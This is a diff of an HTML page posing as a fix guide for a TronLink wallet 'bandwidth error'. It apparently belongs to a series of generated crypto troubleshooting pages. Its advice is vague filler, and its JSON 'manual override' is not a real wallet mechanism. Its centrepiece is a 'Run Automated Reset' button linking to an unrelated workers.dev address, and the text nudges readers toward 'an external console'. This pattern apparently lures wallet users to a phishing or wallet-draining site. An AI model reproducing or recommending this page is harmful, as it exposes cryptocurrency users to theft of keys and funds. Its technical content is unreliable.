@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>Tronlink Bandwidth Error – Fix Guide</title>
+<head><meta charset="UTF-8"><title>TronLink Bandwidth Error – Fix Guide</title>
 <style>
     body {
         font-family: -apple-system;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #00adb5; }
+    a { color: #cf6679; }
     .btn {
-        background: #cf6679;
+        background: #ff9455;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -39,38 +39,40 @@
 </head>
 <body>
 <div class="content">
-<h1>Tronlink Bandwidth Error</h1>
+<h1>TronLink Bandwidth Error</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter an error message indicating a TronLink bandwidth issue, preventing them from completing transactions on the TRON network. The error message may appear when attempting to send TRX, tokens, or interact with smart contracts.</li>
+<li>Users encounter an error message indicating a TronLink bandwidth issue, preventing them from completing transactions or interacting with the TRON ecosystem.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to insufficient bandwidth on the user's TRON account, which is required to process transactions. Bandwidth is a resource that determines how many transactions an account can perform within a certain time frame.</li>
+<li>The error occurs due to insufficient bandwidth or energy on the user's TRON account, which is required to perform transactions and execute smart contracts on the TRON network.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase the account's bandwidth by freezing TRX, which allocates bandwidth for a specific period.</li>
-<li>Use the <code>tronweb</code> library to manually set the bandwidth parameters:</li>
+<li>Increase the account's bandwidth by freezing TRX tokens for a specified period.</li>
+<li>Adjust the transaction's bandwidth and energy limits to optimize resource allocation.</li>
+<li>Use the following JSON configuration to manually override bandwidth settings:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;address&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;user_address&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;frozen&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nt">&quot;frozen_balance&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1000</span><span class="p">,</span>
-<span class="w">    </span><span class="nt">&quot;frozen_duration&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">3</span>
+<span class="w">  </span><span class="nt">&quot;account&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;address&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;user_address&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;frozen&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;frozen_balance&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1000</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;frozen_duration&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">3</span>
+<span class="w">    </span><span class="p">}</span>
 <span class="w">  </span><span class="p">}</span>
 <span class="p">}</span>
 </code></pre></div>
 
+<p>Consider utilizing an external console for more complex configuration adjustments.</p>
+<h2>Prerequisites</h2>
 <ul>
-<li>Utilize the TRON command-line interface to update the account's bandwidth settings.</li>
+<li>TRON account with sufficient TRX balance</li>
+<li>TronLink wallet installed and configured</li>
+<li>Basic understanding of TRON's bandwidth and energy mechanics</li>
 </ul>
-<p>Prerequisites:
-* TRON account with sufficient TRX balance
-* TRON wallet software (e.g., TronLink)
-* Basic understanding of TRON's bandwidth system</p>
-<p>Consider utilizing an external console to execute the necessary commands for a more streamlined experience.</p>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/java-tron-tron-ethcall-returns-cpu-timeout-for-contract-view-fu.html">Java Tron Tron Ethcall Returns Cpu Timeout For Contract View Fu</a></li><li><a href="./archive/2026/06/metamask-extension-bug-permissions-removing-hardware-wallet-acc.html">Metamask Extension Bug Permissions Removing Hardware Wallet Acc</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-sl-tp-percentages-change-when-changing-l.html">Metamask Extension Bug Sl Tp Percentages Change When Changing L</a></li><li><a href="./archive/2026/06/go-ethereum-error-in-block-freeze-operation-errcanonical-hash-m.html">Go Ethereum Error In Block Freeze Operation Errcanonical Hash M</a></li><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
 </div>
